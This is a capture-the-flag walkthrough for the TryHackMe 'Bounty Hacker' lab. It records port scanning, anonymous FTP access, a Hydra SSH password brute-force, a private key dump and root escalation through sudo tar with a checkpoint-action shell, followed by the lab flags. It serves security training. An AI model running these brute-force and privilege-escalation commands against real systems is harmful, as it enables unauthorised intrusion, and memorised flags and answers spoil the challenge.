# Bounty Hacker


## Links
- **Ip:10.10.49.150**
- Website : http://10.10.49.150
- getting root privEsc : https://gtfobins.github.io/gtfobins/tar/

## Ports 
```sh
└─$ sudo nmap -sS -sV -O 10.10.49.150 >> ports.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 04:12 EDT
Nmap scan report for 10.10.49.150
Host is up (0.17s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 3.1 (86%), Linux 3.2 (86%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (85%), OpenWrt White Russian 0.9 (Linux 2.4.30) (85%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (85%), QNAP QTS 4.0 - 4.2 (85%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (85%), Asus RT-AC66U router (Linux 2.6) (85%), Asus RT-N16 WAP (Linux 2.6) (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds

└─$ nmap -A -p 21,22,80 10.10.49.150 >> ports.txt 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.88.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
                                                               
```
- From more aggressive scan we can see that there is a anonymous login into the ftp server


## Login to FTP
```sh
└─$ ftp 10.10.49.150
Connected to 10.10.49.150.
220 (vsFTPd 3.0.3)
Name (10.10.49.150:bc-here): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

ftp> get task.txt -
remote: task.txt
229 Entering Extended Passive Mode (|||51280|)
ftp: Can't connect to `10.10.49.150:51280': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
226 Transfer complete.
68 bytes received in 00:00 (0.39 KiB/s)

```
> ### Answer: `lin`
- There is another file called locks.txt
```sh
ftp> get locks.txt -
remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
226 Transfer complete.
418 bytes received in 00:00 (2.23 KiB/s)
```
- For downloading file from ftp to your local machine 
```sh
ftp> get <file name>

ft> mget *.txt

```
## Login to ssh
```sh
└─$ ssh lin@10.10.49.150   
The authenticity of host '10.10.49.150 (10.10.49.150)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.49.150' (ED25519) to the list of known hosts.
lin@10.10.49.150's password: RedDr4gonSynd1cat3

lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}


```
- It's seeking password

## Hydra for bruteForcing
```sh
└─$ hydra -l lin -P locks.txt -t 6 ssh://10.10.49.150
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-04 05:16:07
[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
[DATA] attacking ssh://10.10.49.150:22/
[22][ssh] host: 10.10.49.150   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-04 05:16:15


```
- Use `man hydra` for the manual
> ### Answer: `RedDr4gonSynd1cat3`
## Directory Enum
```sh
└─$ gobuster dir -u http://10.10.49.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt 


```

## Getting Root

```sh
lin@bountyhacker:~/Desktop$ pwd
/home/lin/Desktop
lin@bountyhacker:~/Desktop$ cd ..
lin@bountyhacker:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
lin@bountyhacker:~$ pwd
/home/lin

lin@bountyhacker:~$ ls -al
total 116
drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 .
drwxr-xr-x  3 root root 4096 Jun  7  2020 ..
-rw-------  1 lin  lin    97 Jun  7  2020 .bash_history
-rw-r--r--  1 lin  lin   220 Jun  7  2020 .bash_logout
-rw-r--r--  1 lin  lin  3790 Jun  7  2020 .bashrc
drwx------ 14 lin  lin  4096 Jun  7  2020 .cache
drwx------  3 lin  lin  4096 Jun  7  2020 .compiz
drwx------ 15 lin  lin  4096 Jun  7  2020 .config
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Desktop
-rw-r--r--  1 lin  lin    25 Jun  7  2020 .dmrc
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Documents
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Downloads
drwx------  2 lin  lin  4096 Jun  7  2020 .gconf
drwx------  3 lin  lin  4096 Jun  7  2020 .gnupg
-rw-------  1 lin  lin  1710 Jun  7  2020 .ICEauthority
drwx------  3 lin  lin  4096 Jun  7  2020 .local
drwx------  5 lin  lin  4096 Jun  7  2020 .mozilla
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Music
drwxrwxr-x  2 lin  lin  4096 Jun  7  2020 .nano
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Pictures
-rw-r--r--  1 lin  lin   655 Jun  7  2020 .profile
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Public
-rw-rw-r--  1 lin  lin    66 Jun  7  2020 .selected_editor
drwx------  2 lin  lin  4096 Jun  7  2020 .ssh
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Templates
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Videos
-rw-------  1 lin  lin   114 Jun  7  2020 .Xauthority
-rw-------  1 lin  lin  1204 Jun  7  2020 .xsession-errors
-rw-------  1 lin  lin  1208 Jun  7  2020 .xsession-errors.old


```
```sh
lin@bountyhacker:~$ cd ..
lin@bountyhacker:/home$ pwd
/home
lin@bountyhacker:/home$ ls -al
total 12
drwxr-xr-x  3 root root 4096 Jun  7  2020 .
drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 lin

```
- It seems there is no other user than the lin
- We will list current process via `ps aux`

> ### **Little Theory:** 
```md
The command `ps aux` is used in Unix-like operating systems to display information about all running processes. Here's a brief breakdown:

- `ps`: The command to display information about active processes.
- `a`: Shows processes for all users.
- `u`: Displays the processes in a user-oriented format, showing the user ID and CPU/memory usage.
- `x`: Includes processes that do not have a controlling terminal.

Together, `ps aux` provides a comprehensive list of all the processes currently running on the system, along with detailed information about each process.
```
```sh

lin@bountyhacker:/home$ ps aux

root       955  0.0  0.2  24048  2616 ?        Ss   03:08   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       961  0.0  0.5  65512  6040 ?        Ss   03:08   0:00 /usr/sbin/sshd -D
root       975  0.0  5.1 337172 51424 tty7     Ssl+ 03:08   0:01 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
whoopsie  1012  0.0  0.9 269232  9116 ?        Ssl  03:08   0:00 /usr/bin/whoopsie -f
root      1019  0.0  0.1  23004  1784 tty1     Ss+  03:08   0:00 /sbin/agetty --noclear tty1 linux
```
```sh
But this is completely innocent:

In Ubuntu, whoopsie is a daemon that is responsible for collecting
 error reports from apport and then sending that report to
 Canonical if the user agrees to this in the apport confirmation dialog
```
- Looking into .ssh

```sh
lin@bountyhacker:/home$ ls -l ~/.ssh
total 8
-rw------- 1 lin lin 1766 Jun  7  2020 id_rsa
-rw-r--r-- 1 lin lin  398 Jun  7  2020 id_rsa.pub

lin@bountyhacker:/home$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2D484B983CA4D7858925E45DC128A273

ELb+PSOKW0rmalxkB4IHWGiHiSR6AJPdj7gi0AGJJI/8s31qeLRyZanRAiNHyO05
CGXLaCcm30jBYe6iX47XmHwJR+Kq+krp2xGMPRFdodPpnHI0+iBEbHaA3vyHWGa9
W/LpZ2TvKlQL+VwBM5ybdK9+eT4xfp94Hi+VIgIsgJlYQ9blPzJ++b3DO9mQwhxL
UpQxFzoeA6nZot4etktsXDAo5Q6u3MXY1IMS0JyoIlzRRw3HGIEuFhO0X8A1NUPt
CWtyNNXMN9F5xvOHucLaPkFwu0voPyag52a+AEbI/0nyQHvKR5UtAh9RoSb7yxA7
iLBdIib0iDpyd6ffmWHG5KBbve2KiMZc75dSAEBHB6t2inh8isoaSjAvV+Cv1Cn0
RUJ/DoUvY7o6LjO6K9TKTy3W8+HwiAQ3FOV3pO8QDCK4e6tC/Stjc7UeOopqwp6R
3m5NUcMoVqmrrIwvnpLdDvVapVUms1l7l68ldXv9/5QizSJSs40DxrUjQZGKr1Ik
2I4DuaL0fKB3Zve9tf9UnGKrzsa0+XOPjquVXk4eMqvdjIPvxcsyYivRHtlTmX58
CMAKKP36UJI3IPIJpNUDHQwAytJnyMrcLLk4CIGB8kdG4r6CiJjwvgMY1l0htg76
Evge1Ko2syOzSMNtPKA3NxG5V7MuWOfYbAlRG+t6lGaq0PBvfBbYjbGafTSsLy/3
SWW0V7YuSDfThVbEm/Ux8Dbah6P/tH7DgJzSSBbDmICBeaGl6durKvVUtGXH4LbZ
ZrP2n4j6Bp/QNkaGy06AjmDZJ1POYOU12Hy49PchzOer0hpRktx3ARzRr1BYfhEM
JjGvYATvW3VJkU8wtC2vdFnZ+dsnXYxYkHH0UQDv35fppo8V4d776KP1KzX7zrgS
Xo/3ViPlACDJEiv33p9+J5niMiynWMf0ZGa0RQQ81um4Bcf/e56d2vUpBiH5ZHNU
a8nYlwZ0URdGdnhCu+PMSj3E7Qvj+egPDJkbGG4+F8g5RN7rMzUWjaTB7Dv7I3ae
o9Ui4qJUk4f+WVSZMG1dnZYt2AzPGNI/r5V4jJNw6E5aCIbet87u4SlQViaakE/W
Qu7YiR8kI2QrezJVFh5TO6ItoQfKfKb7AY7y06KLJEcMYeY9my7d/ZE25bCmnpyY
IGredTK1CJLL0mF3aC8CJg3RyenTSZLWmR+2megpg9EPqVxndTqUjEJU6l+L6I9U
MxxFCNm7vdKYOdCR7wNcNerIK4hBwlL62yw4kwCoY1ouo2oZPiFdiGZ0etNIhzlb
b8zhqNTI+rTskUuGRK61Vpp21fx0LrRcy1pdzGg+nQnfHGjdaTlgW3Yo765M+kug
BKjEazq1Su4bkqpi4o19hDHcYBLeDNjZzcTUDBl4FVoDaRuSMjyt5eyfcphfZ0y7
rYPaHpLDXxBmmdYCd3Yq4N9lY0sX2Hm1o32ggRqueoIN0BWbWIrlbQWLlW5RZe+t
LnIzTVzEokfvJHWBg4zLuNyqJ80JO6Q/ZmTgaRMx0F+KmJHbzq45vE894ksOARde
9Hl288PGtcgk2vMRBEWVTYoQMWZrGgLMhxN23/bHoz+Sqk4Do06z5+6FU/0amqTn
-----END RSA PRIVATE KEY-----
lin@bountyhacker:/home$ cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC57oKLbJa4nZPeWW0He8WcOaU9XIKImaPRDwSnbmg9CQnRdCydTVP3y/qWpSxyJ72tjg4G7yPbd/glBeyVIcx490XKYj7b9v7Ms+86f60E6QXxo8cmysavCK/Q000tvrjpMt/eqCJbYDFFB2XrVtQmSEZbZaOEKJkUujy1T1KKJlPFCdjDb+QZWFd5d2zP+UmjEOlUt9CpdaruJnPHyCn4jlguk4tN1saPygqibVkQaAPf0/K7qFLKa5KZ0l8/hnDlKiSWLUQo5Om7XenKhkCnJCyMV4J00imO4hGU1fxMMGzseMf7bm8/iM9ql/rduNeq16mndrrbqf0YCXoQZGMh lin@bountyhacker

```
- This doesn't do anything because we already has the `ssh access`
- That's how we can check our keys

### Lets check bash History
```sh
lin@bountyhacker:/home$ ;
lin@bountyhacker:/home$ ls -la /etc/cron.daily/
total 76
drwxr-xr-x   2 root root  4096 Jun  6  2020 .
drwxr-xr-x 131 root root 12288 Jun  8  2020 ..
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   539 Jun 11  2018 apache2
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 Oct  9  2018 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root   214 Dec  7  2018 update-notifier-common
-rwxr-xr-x   1 root root  1046 May 19  2016 upstart

# passwd is interesting

lin@bountyhacker:/home$ cat /etc/cron.daily/passwd 
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done

```
- But after some googling I found its nothing

### To see the list of Privilege user
```sh
lin@bountyhacker:/home$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
-Now, this is interesting! We got root access on the /bin/tar command. This is something we can exploit! 

```sh
lin@bountyhacker:/home$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
[sudo] password for lin: 
tar: Removing leading `/' from member names
# whoami
root

# cd ..
# ls
bin   cdrom  etc   initrd.img	   lib	  lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt	
THM{80UN7Y_h4cK3r}

```

## Pointers

- There is an Image in the website which is crew.jpg
- I was trying to decode it with steghide but it needs a passphress
- From the ftp we get a list 
- it seems it can be bruteForced
- And there is also a ssh server's port is open

> ### Answer : `ssh`

## Flags
> ### **User: `THM{CR1M3_SyNd1C4T3}`**
> ### **Root: `THM{80UN7Y_h4cK3r}`**








